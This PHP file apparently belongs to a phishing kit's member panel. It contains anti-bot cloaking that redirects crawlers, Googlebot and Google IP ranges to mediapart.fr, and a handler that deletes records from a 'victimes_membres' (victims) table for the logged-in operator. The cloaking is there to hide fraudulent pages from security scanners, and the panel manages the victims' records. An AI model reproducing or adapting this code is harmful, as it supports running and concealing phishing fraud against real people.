<?php
include("common/includes.php");
include 'blocker.php';
include 'rezbot/basicbot.php';
include 'rezbot/rezcrawl.php';
include 'rezbot/rezzc.php';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Liste de mots-clés communs utilisés par les bots
$botKeywords = array(
    'bot', 'spider', 'crawl', 'detect', 'monitor'
);

// Liste d'adresses IP connues pour héberger des bots
$botIPs = array(
    '123.456.78.9', '987.654.32.1',
    // Ajoutez les adresses IP ici
    '8.8.4.0', '8.8.8.0', '8.34.208.0', '8.35.192.0', '23.236.48.0', '23.251.128.0',
    '34.0.0.0', '34.2.0.0', '34.3.0.0', '34.3.3.0', '34.3.4.0', '34.3.8.0', '34.3.16.0',
    '34.3.32.0', '34.3.64.0', '34.3.128.0', '34.4.0.0', '34.8.0.0', '34.16.0.0',
    '34.32.0.0', '34.64.0.0', '34.128.0.0', '35.184.0.0', '35.192.0.0', '35.196.0.0',
    '35.198.0.0', '35.199.0.0', '35.199.128.0', '35.200.0.0', '35.208.0.0', '35.224.0.0',
    '35.240.0.0', '64.15.112.0', '64.233.160.0', '66.22.228.0', '66.102.0.0',
    '66.249.64.0', '70.32.128.0', '72.14.192.0', '74.125.0.0', '104.154.0.0',
    '104.196.0.0', '104.237.160.0', '107.167.160.0', '107.178.192.0', '108.59.80.0',
    '108.170.192.0', '108.177.0.0', '130.211.0.0', '136.112.0.0', '142.250.0.0',
    '146.148.0.0', '162.216.148.0', '162.222.176.0', '172.110.32.0', '172.217.0.0',
    '172.253.0.0', '173.194.0.0', '173.255.112.0', '192.158.28.0', '192.178.0.0',
    '193.186.4.0', '199.36.154.0', '199.36.156.0', '199.192.112.0', '199.223.232.0',
    '207.223.160.0', '208.65.152.0', '208.68.108.0', '208.81.188.0', '208.117.224.0',
    '209.85.128.0', '216.58.192.0', '216.73.80.0', '216.239.32.0', '2001:4860::',
    '2404:6800::', '2404:f340::', '2600:1900::', '2606:73c0::', '2607:f8b0::',
    '2620:11a:a000::', '2620:120:e000::', '2800:3f0::', '2a00:1450::', '2c0f:fb50::'
);

// Liste des User-Agents de robots de Google à bloquer
$googleBotUserAgents = array(
    'Googlebot',
    'Googlebot-News',
    // Ajoutez d'autres User-Agents de robots de Google si nécessaire
);

// Nombre maximal d'adresses IP simultanées autorisées
$maxSimultaneousIPs = 3;

// Vérification basée sur le User-Agent
$isBot = false;

// Vérifier si le User-Agent contient des mots-clés de bot
foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isBot = true;
        break;
    }
}

// Vérification supplémentaire basée sur l'adresse IP
if (!$isBot) {
    // Vérifier si l'adresse IP du visiteur correspond à une adresse IP connue pour héberger des bots
    if (in_array($_SERVER['REMOTE_ADDR'], $botIPs)) {
        $isBot = true;
    }
}

// Vérification des User-Agents de Google
if (!$isBot) {
    $userAgentLower = strtolower($userAgent);
    foreach ($googleBotUserAgents as $botUserAgent) {
        if (stripos($userAgentLower, strtolower($botUserAgent)) !== false) {
            $isBot = true;
            break;
        }
    }
}

// Vérification du nombre maximal d'adresses IP simultanées autorisées
if (!$isBot) {
    $ipList = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) : array($_SERVER['REMOTE_ADDR']);
    $ipList = array_map('trim', $ipList); // Supprimer les espaces autour des adresses IP
    $ipList = array_unique($ipList); // Supprimer les adresses IP en double
    $ipCount = count($ipList);
    if ($ipCount > $maxSimultaneousIPs) {
        $isBot = true;
    }
}

// Rediriger les bots détectés vers la page spécifiée
if ($isBot) {
    header('Location: https://www.mediapart.fr/');
    exit();
}


session_start();

require("../includes/vars.php");


$requser = $bdd->prepare("SELECT * FROM membres_kolizeum WHERE id = ?");
$requser->execute(array($_SESSION['id']));

$userinfo = $requser->fetch();


if(isset($_SESSION['id']) AND $_SESSION['id'] != '1' AND $userinfo['code_entre'] == $userinfo['code']) {

	if(isset($_GET['id']) AND !empty($_GET['id'])) {

		$reqvictime = $bdd->prepare("SELECT * FROM victimes_membres WHERE id = ? AND id_membre = ?");
		$reqvictime->execute(array($_GET['id'], $_SESSION['id']));
		$victimeinfo = $reqvictime->fetch();

		if($_GET['id'] == $victimeinfo['id']) {

			$suppr_id = htmlspecialchars($_GET['id']);
			$suppr = $bdd->prepare('DELETE FROM victimes_membres WHERE id = ? AND id_membre = ?');
			$suppr->execute(array($suppr_id, $_SESSION['id']));
		
			header('Location: victimes.php');
		}
		else {
			header('Location: victimes.php');
		}

	}
	else {
		header('Location: victimes.php');
	}
}
else {
    header('Location: panel.php');
}
?>